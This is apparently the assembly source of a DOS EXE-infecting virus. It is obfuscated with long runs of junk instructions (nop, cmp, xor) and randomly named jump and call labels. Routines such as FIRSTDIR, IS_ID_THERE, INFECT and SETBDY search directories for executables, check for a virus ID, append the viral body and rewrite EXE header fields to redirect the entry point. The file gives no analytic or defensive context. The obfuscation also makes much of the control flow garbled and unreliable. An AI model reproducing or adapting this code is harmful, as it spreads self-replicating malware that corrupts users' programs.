cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
OLKXS:
		JMP 	ECHOT
cmp cx,dx
cmp cx,dx
ECHOT:
		JMP 	OBPEX
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
OBPEX:
		JMP 	RKLNI
nop
nop
nop
RKLNI:
 	 mov BYTE PTR [di],0 
TIWW_:
		JMP 	QJSAZ
XXOMU:
JNZ RGDER
JMP UJMBS
RGDER:
		JMP 	UIHCF
KHMBG:
JZ HLUFR
JMP _WYAU
HLUFR:
JZ HLCKH
JMP FCAPV
HLCKH:
	 stc
SSNMG:
		call 	 GBIDA
UIVZV:
		call 	 ROBQC
RQLHE:
		call 	 UDVIP
JSOFR:
		call 	 UOBQU
	 ret

FENC:
	 pop di
QBO_J:
		call 	 IJAVS
LBBTL:
		call 	 LCDOS
	 ret
_WYAU:
ZUSPI:
		call 	 IFTFW
MGTRJ:
		call 	 KYALP
NBWGE:
		call 	 LOSRJ
XZIVM:
		call 	 RKTLZ
		call 	 HLUFR


FIRSTDIR:
	 call GET_DTA
	 push dx 
	 mov ah,1AH 
JZ UOBQU
JMP JSOFR
UOBQU:
JNZ RKTLZ
JMP XZIVM
RKTLZ:
JNZ KYALP
JMP MGTRJ
KYALP:
JNZ UDVIP
JMP RQLHE
UDVIP:
	 int 21H
		JMP 	RXDDA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
RXDDA:
	 mov dx,OFFSET USEFILE
BTXGU:
		JMP 	NBWGE
LOSRJ:
JNZ LCDOS
JMP LBBTL
LCDOS:
		JMP 	UIVZV
ROBQC:
		JMP 	XYC_L
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
XYC_L:
	 mov cx,10H 
GIWQT:
TEAD_:
		JMP 	ZUSPI
IFTFW:
JZ KD_SH
JMP BLCTV
KD_SH:
		JMP 	D_VHX
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
D_VHX:
		JMP 	SEMGA
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
SEMGA:
		JMP 	PNDXG
xor bx,cx
xor bx,cx
xor bx,cx
PNDXG:
	 mov ah,4EH 
JZ JVQPH
JMP NUVAL
JVQPH:
JNZ IJSGO
JMP VHJGY
IJSGO:
JNZ QJIWE
JMP XKAGH
QJIWE:
XKAGH:
		call 	 QJIWE
VHJGY:
		call 	 IJSGO
NUVAL:
		call 	 JVQPH
	 int 21H

NEXTD1:
	 pop bx 
	 or al,al 
	 jz N12
	 JMP NEXTD3 
	 N12:
	 test BYTE PTR [bx+15H],10H 
	 jnz N13
	 JMP NEXTDIR 
	 N13:
	 cmp BYTE PTR [bx+1EH],’.’ 
	 je N14
	 JMP NEXTD2 
	 N14:
	 
NEXTDIR: 
	 call GET_DTA 
	 push dx
		JMP 	JOTOI
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
JOTOI:
	 mov ah,1AH 
OMVIF:
JNZ YHQPU
JMP RMDCE
YHQPU:
JZ XYQSV
JMP OESXT
XYQSV:
		JMP 	OUOHX
CKYSB:
	 int 21H
		JMP 	LXZTO
nop
nop
nop
nop
nop
nop
nop
nop
nop
LXZTO:
	 mov ah,4FH
MNXNV:
RPZPH:
TQFE_:
JNZ IZLQS
JMP PEBAD
IZLQS:
JNZ FURZU
JMP EHGVC
FURZU:
		JMP 	XKORR
HYPTH:
		JMP 	HQTMG
NEYEO:
	 int 21H 
HQTMG:
		call 	 NEYEO
OESXT:
		call 	 XYQSV
RMDCE:
		call 	 YHQPU
EHGVC:
		call 	 FURZU
PEBAD:
		call 	 IZLQS
	 jmp NEXTD1 ;SHORT NEXTD1 -- uncomment for short jump

NEXTD2:
 	 xor al,al 

NEXTD3:
	 ret 
XKORR:
		call 	 HYPTH
OUOHX:
		call 	 CKYSB


GET_DTA:
		JMP 	KZZCX
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
KZZCX:
		JMP 	DVYFM
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
DVYFM:
		JMP 	VIMLP
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
VIMLP:
 mov dx,OFFSET DTA2
ABUMH:
HHWZC:
JZ RGBC_
JMP _SXTE
RGBC_:
JZ QAV_E
JMP NXWMN
QAV_E:
		JMP 	VGMHM
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
VGMHM:
 mov al,2BH
FTQPY:
JGVKB:
WDIQV:
XGMAI:
D_N_H:
JZ TGK_C
JMP ADKQT
TGK_C:
		JMP 	ADUSQ
SWHDI:
 mul [LEVEL]
 add dx,ax 
 ret
IIVRO:
		call 	 ZHNDQ
HNKEQ:
NXWMN:
		call 	 QAV_E
		call 	 XEZKQ
_SXTE:
ADUSQ:
		call 	 SWHDI
		call 	 RGBC_
ADKQT:
		call 	 TGK_C


CONCAT:
		JMP 	TSCQN
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
TSCQN:
		JMP 	KN_FS
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
KN_FS:
	 mov al,byte ptr es:[di] 
		JMP 	BWYBH
T_ZBK:
JZ U_FTK
JMP JLIBX
U_FTK:
		JMP 	HNKEQ
XEZKQ:
		JMP 	IIVRO
ZHNDQ:
	 inc di
	 or al,al
	 jnz CONCAT ;unmodified code be careful rit
	 dec di 
JLIBX:
		call 	 U_FTK
BWYBH:
		call 	 T_ZBK
	 push di 

CONCAT2:
	 cld
	 lodsb 
	 stosb
	 or al,al
	 jnz CONCAT2 ;unmodified code be careful rit
	 pop di 
IUAUZ:
		call 	 WPHJT
WICXM:
		call 	 BMXFQ
	 ret 	 


FILE_OK:
	 call GET_EXE_HEADER 
	 jnc N15
	 JMP OK_END 
	 N15:
	 call CHECK_SIG_OVERLAY 
	 jnc N16
	 JMP OK_END 
	 N16:
	 call REL_ROOM 
	 jnc N17
	 JMP OK_END 
	 N17:
	 call IS_ID_THERE 

OK_END: ret 	 


CHECK_SIG_OVERLAY:
		 mov al,’M’ 
		cmp 	cx,ax
JZ BMXFQ
JMP WICXM
BMXFQ:
		JMP 	IUAUZ
WPHJT:
		JMP 	JNLGI
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
JNLGI:
		JMP 	VJYJL
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
VJYJL:
		 mov ah,’Z’
JNZ YVELV
JMP PRRAK
YVELV:
		JMP 	FVZFA
WKCQN:
		JMP 	_JUAG
OALKU:
		 cmp ax,WORD PTR [EXE_HDR]
		 jnz N18
		 JMP CSO_1
		 N18:
		 stc 
PRRAK:
		call 	 YVELV
		 ret

CSO_1: 	 xor ax,ax
	     sub ax,WORD PTR [EXE_HDR+26]
_JUAG:
		call 	 OALKU
	     ret 
FVZFA:
		call 	 WKCQN


GET_EXE_HEADER:
	 mov dx,OFFSET USEFILE
QANVD:
		JMP 	CTDHG
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
CTDHG:
	 mov ax,3D02H 
	 int 21H
	 jnc N19
	 JMP RE_RET 
	 N19:
	 mov [HANDLE],ax 
	 mov bx,ax 
MGBXS:
JNZ _TQIS
JMP KWDMU
_TQIS:
JZ RGUQX
JMP BBAGT
RGUQX:
	 mov cx,1CH 
JNZ NDX_P
JMP DQHTV
NDX_P:
JNZ AMKEO
JMP IWXKD
AMKEO:
JZ FXHHU
JMP ASPAY
FXHHU:
	 mov dx,OFFSET EXE_HDR 
JZ SBBBV
JMP RS_VZ
SBBBV:
		JMP 	HEEVK
SCZJW:
	 mov ah,3FH
IWXKD:
		call 	 AMKEO
KWDMU:
		call 	 _TQIS
RS_VZ:
		call 	 SBBBV
DQHTV:
		call 	 NDX_P
	 int 21H

ASPAY:
		call 	 FXHHU
RE_RET: ret 
BBAGT:
		call 	 RGUQX


REL_ROOM:
		JMP 	RZFXF
xor bx,cx
xor bx,cx
RZFXF:
	 mov ax,WORD PTR [EXE_HDR+8] 
		JMP 	NDLLR
RRBRA:
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+6] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+24] 
HEEVK:
		call 	 SCZJW
ZGKLW:
		call 	 SISDC
NDLLR:
		call 	 RRBRA
	 cmp ax,4*NUMRELS 

IFTWR:
		call 	 JDTAY
FTDIK:
		call 	 XJOQL
XU_K_:
		call 	 QUPNM
RR_RET: ret     
TJVRU:
		call 	 QQAOL


IS_ID_THERE:
	 mov ax,WORD PTR [EXE_HDR+22] 
JNZ QQAOL
JMP TJVRU
QQAOL:
		JMP 	XU_K_
QUPNM:
JZ SISDC
JMP ZGKLW
SISDC:
JNZ XJOQL
JMP FTDIK
XJOQL:
	 add ax,WORD PTR [EXE_HDR+8] 
	 mov dx,16
	 mul dx
		JMP 	KBRSA
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
KBRSA:
		JMP 	OOEJX
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
OOEJX:
	 mov cx,dx
VOXDD:
		JMP 	CHSYM
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
CHSYM:
		JMP 	GLFOY
nop
nop
nop
nop
nop
nop
nop
GLFOY:
	 mov dx,ax 
		JMP 	XLNBC
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
XLNBC:
		JMP 	TEGUL
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
TEGUL:
	 mov bx,[HANDLE]
		JMP 	KBSPF
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
KBSPF:
	 mov ax,4200H 
	 int 21H
		JMP 	OLTYP
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
OLTYP:
	 mov ah,3FH
	 mov bx,[HANDLE]
		JMP 	BIYYP
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
BIYYP:
	 mov dx,OFFSET VIDC
XBOFM:
UEJTH:
JNZ H_ZCZ
JMP RXSU_
H_ZCZ:
	 mov cx,2 
HZAOU:
QXCRE:
JNZ JDTAY
JMP IFTWR
JDTAY:
	 int 21H
	 jnc N20
	 JMP II_RET 
	 N20:
		JMP 	YZGWV
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
YZGWV:
	 mov ax,[VIDC]
JNZ RUZGI
JMP AWHKN
RUZGI:
		JMP 	VM_LQ
ELSPG:
		JMP 	RWZWP
FISSS:
	 cmp ax,[VIRUSID] 
	 clc
	 jz N21
	 JMP II_RET 
	 N21:
RWZWP:
		call 	 FISSS
RXSU_:
		call 	 H_ZCZ
VM_LQ:
		call 	 ELSPG
MUIYT:
		call 	 UKSJZ
SEXXO:
		call 	 MZEAK
	 stc 

II_RET: ret
AWHKN:
OECZO:
		call 	 KEKDP
		call 	 RUZGI


SETBDY:
	 mov al,BYTE PTR [FSIZE]
		JMP 	OECZO
KEKDP:
		JMP 	SEXXO
MZEAK:
	 and al,0FH 
	 jnz N22
	 JMP SB_E 
	 N22:
	 mov cx,10H 
JZ UKSJZ
JMP MUIYT
UKSJZ:
JNZ GKOHK
JMP BKPDA
GKOHK:
	 sub cl,al 
		JMP 	ACACW
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
ACACW:
		JMP 	FWVED
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
FWVED:
	 mov dx,OFFSET FINAL
BAFA_:
	 add WORD PTR [FSIZE],cx 
	 adc WORD PTR [FSIZE+2],0
		JMP 	SVRNW
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
SVRNW:
		JMP 	NSZEP
nop
nop
nop
nop
nop
nop
nop
nop
NSZEP:
	 mov bx,[HANDLE]
		JMP 	ZYRHE
EMNQK:
		JMP 	FHIQB
xor bx,cx
FHIQB:
		JMP 	NJUAX
nop
NJUAX:
	 mov ah,40H 
JZ QIBFS
JMP CNLDP
QIBFS:
		JMP 	FWPXS
JWSJO:
JNZ FTCQJ
JMP QKFMO
FTCQJ:
A_BZN:
		call 	 YIFUF
GHVQU:
		call 	 OBOMX
ZYRHE:
		call 	 EMNQK
FWPXS:
		call 	 JWSJO
CNLDP:
		call 	 QIBFS
	 int 21H

SB_E: ret
AJLNW:
QKFMO:
		call 	 FTCQJ
		call 	 OUVRT
BKPDA:
		call 	 GKOHK
SIDLR:
		call 	 FOFJF
LTDVB:
PJNOP:
		call 	 VPYTH
		call 	 OEHCN
IRUQF:
_PLWR:
		call 	 VBHFK
FZXEQ:
		call 	 AWKHF
		call 	 DEQWS
KQNUH:
DAEBO:
		call 	 FP_SG
		call 	 OHTGP


INFECT:
	 mov cx,WORD PTR [FSIZE+2]
JNZ AWKHF
JMP FZXEQ
AWKHF:
JNZ VBHFK
JMP _PLWR
VBHFK:
	 mov dx,WORD PTR [FSIZE]
JZ OEHCN
JMP LTDVB
OEHCN:
		JMP 	SIDLR
FOFJF:
	 mov bx,[HANDLE]
JZ FP_SG
JMP DAEBO
FP_SG:
		JMP 	IRUQF
DEQWS:
	 mov ax,4200H 
JNZ OHTGP
JMP KQNUH
OHTGP:
JNZ OBOMX
JMP GHVQU
OBOMX:
	 int 21H 
	 call SETBDY 
	 mov cx,OFFSET FINAL 
WDRW_:
JNZ VPYTH
JMP PJNOP
VPYTH:
	 xor dx,dx 
	 mov bx,[HANDLE] 
RGFZU:
JNZ YIFUF
JMP A_BZN
YIFUF:
	 mov ah,40H 
CGPDH:
	 int 21H
	 mov dx,WORD PTR [FSIZE] 
		JMP 	QARXA
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
QARXA:
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1 
	 inc bx
	 add dx,bx
	 mov bx,0
XLIEN:
QSTUV:
	 adc cx,bx 
	 mov bx,[HANDLE]
MSUHX:
		JMP 	AJLNW
OUVRT:
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+14 
PIYZX:
		JMP 	UDHJK
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
UDHJK:
	 mov bx,[HANDLE] 
EJFD_:
	 mov cx,2
_SATJ:
ACY_W:
	 mov ah,40H 
YIYSR:
	 int 21H
	 mov dx,WORD PTR [FSIZE]
NVRZC:
VSZID:
QOHOX:
		JMP 	QWHLA
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
QWHLA:
	 mov cx,WORD PTR [FSIZE+2]
MGXIC:
WSUXW:
HICIL:
		JMP 	_ABJT
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
_ABJT:
	 mov bx,OFFSET REL1A 
VVXZO:
	 inc bx 
	 add dx,bx
		JMP 	GGHXP
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
GGHXP:
	 mov bx,0
XKDNC:
	 adc cx,bx 
		JMP 	YYIPE
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
YYIPE:
	 mov bx,[HANDLE]
FIRXP:
TGWIR:
	 mov ax,4200H 
	 int 21H
		JMP 	VMHQG
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
VMHQG:
	 mov dx,OFFSET EXE_HDR+16 
KQUSG:
WQKHD:
	 mov bx,[HANDLE] 
BVORE:
	 mov cx,2
	 mov ah,40H 
KSHGU:
	 int 21H
		JMP 	IBKUK
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
IBKUK:
	 mov dx,WORD PTR [FSIZE]
JDFRR:
	 mov cx,WORD PTR [FSIZE+2]
NUEBA:
BDG_Y:
VAZR_:
DEFJK:
	 mov bx,OFFSET REL2 
WAUGP:
UQS_K:
JSZMV:
	 add bx,1 
	 add dx,bx
	 mov bx,0
VPPQI:
UPQTK:
	 adc cx,bx 
		JMP 	_X_OD
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
_X_OD:
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+20 
KYFZG:
		JMP 	VZHVZ
nop
nop
VZHVZ:
	 mov bx,[HANDLE]
QWKBL:
	 mov cx,4
_S_BL:
	 mov ah,40H 
MEZTX:
OEOMR:
	 int 21H
	 xor cx,cx
	 xor dx,dx
	 mov bx,[HANDLE]
	 mov ax,4200H 
QMRGT:
IILAL:
RBTIA:
	 int 21H
	 mov ax,WORD PTR [FSIZE] 
		JMP 	DGADP
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
DGADP:
	 mov cl,4 
ZTPAZ:
O_IGJ:
	 shr ax,cl 
	 mov bx,WORD PTR [FSIZE+2]
	 and bl,0FH
	 mov cl,4
IBTSJ:
IGGES:
KWHFK:
SKXBL:
	 shl bl,cl
	 add ah,bl
	 sub ax,WORD PTR [EXE_HDR+8] 
		JMP 	PUPFU
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
PUPFU:
	 mov WORD PTR [EXE_HDR+22],ax
	 mov bx,OFFSET FINAL 
TQ_OP:
	 add bx,10H 
	 mov cl,4 
NXZSV:
	 shr bx,cl
	 add ax,bx
		JMP 	HZUDA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
HZUDA:
	 mov WORD PTR [EXE_HDR+14],ax 
QRW_D:
ABELL:
		JMP 	FAAYA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
FAAYA:
	 mov ax,OFFSET VIRUS 
WACWY:
UFPVT:
	 mov WORD PTR [EXE_HDR+20],ax 
JZYBK:
QCVSW:
AFOMQ:
UIFJO:
	 mov ax,STACKSIZE 
UFYTX:
XBRCS:
		JMP 	HXJBT
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
HXJBT:
		JMP 	SV_JX
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
SV_JX:
	 mov WORD PTR [EXE_HDR+16],ax ;and save it
LM_BC:
		JMP 	UOTFO
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
UOTFO:
	 mov dx,WORD PTR [FSIZE+2]
KMRHS:
	 mov ax,WORD PTR [FSIZE] 
QMLMF:
WLOOR:
	 mov bx,OFFSET FINAL
	 add ax,bx
	 xor bx,bx
	 adc dx,bx 
	 add ax,200H 
	 adc dx,bx
	 push ax
		JMP 	BOPAH
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
BOPAH:
	 mov cl,9
VQDWH:
LXXNN:
ROFZA:
	 shr ax,cl
	 mov cl,7
NIJW_:
WPFRK:
	 shl dx,cl
	 add ax,dx
	 mov WORD PTR [EXE_HDR+4],ax 
EUBFZ:
K_MCZ:
	 pop ax
	 and ax,1FFH 
	 mov WORD PTR [EXE_HDR+2],ax 
TSMLA:
	 mov ax,NUMRELS 
LMHAD:
	 add WORD PTR [EXE_HDR+6],ax
	 mov cx,1CH 
SJITJ:
		JMP 	CAMKD
nop
nop
CAMKD:
	 mov dx,OFFSET EXE_HDR
ZBAPA:
	 mov bx,[HANDLE]
HICPE:
	 mov ah,40H 
WYFZB:
CGKAG:
	 int 21H
		JMP 	IO_FQ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
IO_FQ:
	 mov ax,WORD PTR [EXE_HDR+6] 
QUHJP:
KJXNV:
TMNLJ:
	 dec ax 
	 dec ax 
		JMP 	TZPYU
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
TZPYU:
	 mov bx,4 
	 mul bx
	 add ax,WORD PTR [EXE_HDR+24]
	 mov bx,0
	 adc dx,bx 
	 mov cx,dx
BJUJB:
	 mov dx,ax
PBKDY:
		JMP 	MYX_R
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
MYX_R:
		JMP 	BDZWV
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
BDZWV:
	 mov bx,[HANDLE]
NUAMT:
ILHHO:
	 mov ax,4200H 
NLJOQ:
OZTAO:
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL1 
CNHRL:
	 inc bx 
	 mov WORD PTR [EXE_HDR],bx 
VTKNZ:
CIIRE:
		JMP 	KKNMB
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
KKNMB:
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,WORD PTR [EXE_HDR+22]
KZOWV:
		JMP 	ILRRA
WXREC:
	 mov bx,OFFSET REL2
		JMP 	BMCRR
KUBDI:
	 add bx,3 
	 mov WORD PTR [EXE_HDR+4],bx 
ZPQKI:
		JMP 	A_KLH
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
A_KLH:
	 mov WORD PTR [EXE_HDR+6],ax
JZ FTGVA
JMP ZQWVN
FTGVA:
		JMP 	ANEDY
cmp cx,dx
cmp cx,dx
cmp cx,dx
ANEDY:
		JMP 	GOMFA
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
GOMFA:
	 mov cx,8 
BNFNO:
JNZ JKLKN
JMP ZUSGX
JKLKN:
		JMP 	GGIR_
nop
nop
nop
nop
nop
nop
nop
GGIR_:
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H
	 ret 
ILRRA:
ZUSGX:
		call 	 JKLKN
		call 	 WXREC

BMCRR:
		call 	 KUBDI


TIMECT EQU 63 
ZQWVN:
KPTZB:
		call 	 WZNVK
		call 	 FTGVA


SHOULDRUN:
NKVMQ:
		call 	 OGHDM
	 xor ah,ah 

SR1: ret 
 	 int 1AH
 	 and dl,TIMECT 
AYKTQ:
		call 	 FXMZP
HYAPT:
		call 	 WDCS_
 	 ret ;
XOEGO:
		call 	 NFNIR



SETSR:
		JMP 	TDWVL
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
TDWVL:
	 mov al,90H 
	 mov BYTE PTR SR1,al 
JZ WZNVK
JMP KPTZB
WZNVK:
PZDNS:
		call 	 JGOXP
	 ret
GUSQF:
		call 	 GSXOK
QVPJD:
		call 	 LYOLI
SZATE:
		call 	 MGQKV
PAEAC:
		call 	 JQRDN


NEW_DTA:
	 mov ah,2FH 
JNZ MGQKV
JMP SZATE
MGQKV:
JNZ OGHDM
JMP NKVMQ
OGHDM:
	 int 21H
	 mov WORD PTR [OLDDTA],bx
		JMP 	XOEGO
NFNIR:
	 mov ax,es
JZ JQRDN
JMP PAEAC
JQRDN:
JZ WDCS_
JMP HYAPT
WDCS_:
JNZ FXMZP
JMP AYKTQ
FXMZP:
	 mov WORD PTR [OLDDTA+2],ax
		JMP 	RHHVQ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
RHHVQ:
	 mov ax,cs
IWNOF:
NWQWK:
JNZ LYOLI
JMP QVPJD
LYOLI:
	 mov es,ax 
KBLOI:
	 mov dx,OFFSET DTA1 
		JMP 	PZDNS
JGOXP:
	 mov ah,1AH
XPNVI:
JZQJ_:
XVCOH:
JZ IXXMU
JMP EVFGN
IXXMU:
JZ NNOQW
JMP IBGQY
NNOQW:
JZ BIRNO
JMP HIOP_
BIRNO:
JZ GSXOK
JMP GUSQF
GSXOK:
	 int 21H 
AMUYB:
		call 	 RNYNF
OMWJQ:
		call 	 FRCFT
HIOP_:
		call 	 BIRNO
IBGQY:
		call 	 NNOQW
EVFGN:
		call 	 IXXMU
VMUYF:
		call 	 BTUZO
JIHZE:
		call 	 DVEQC
	 ret

RESTORE_DTA:
		JMP 	XBTYH
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
XBTYH:
	 mov dx,WORD PTR [OLDDTA] 
		JMP 	OMWJQ
FRCFT:
	 mov ax,WORD PTR [OLDDTA+2]
		JMP 	JIHZE
DVEQC:
JNZ BTUZO
JMP VMUYF
BTUZO:
		JMP 	RSYAM
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
RSYAM:
	 mov ds,ax
RAYN_:
JZ RNYNF
JMP AMUYB
RNYNF:
		JMP 	WUEMJ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
